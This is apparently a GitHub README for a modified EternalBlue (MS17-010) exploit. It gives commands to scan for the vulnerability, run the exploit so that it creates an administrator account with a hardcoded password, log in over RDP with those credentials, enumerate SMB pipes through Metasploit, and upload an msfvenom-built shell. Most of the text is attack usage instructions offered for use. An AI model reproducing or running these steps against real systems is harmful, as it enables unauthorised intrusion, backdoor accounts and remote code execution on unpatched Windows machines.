# EternalBlue
I have done some changes to the https://raw.githubusercontent.com/worawit/MS17-010/master/zzz_exploit.py developed by sleepya. This script create a new user and add the user to administrator group

Detect the vulnerability
nmap --script smb-vuln-ms17-010 -p445 <target_ip>

## eternalblue_user_create.py

How to run the exploit
python exploit.py <target_ip> <pipe_name>
once the user is created you can logged in to the system using rdesktop
```
 user    : John
 password: fadf24as
```

rdesktop -u John -p fadf24as <target_ip>

### How to find the pipe

msfconsole
```
#use auxiliary/scanner/smb/pipe_auditor
#set rhosts <target_ip>
#run
```

Result
```
Pipes: \netlogon, \lsarpc, \samr, \browser, \atsvc, \epmapper, \eventlog, \InitShutdown, \lsass, \ntsvcs, \router, \scerpc, \srvsvc, \tapsrv, \wkssvc
```

## eternalblue_shell_upload.py

replace /root/Desktop/shell.exe with your local shell path.

shell script can be create using msfvenom
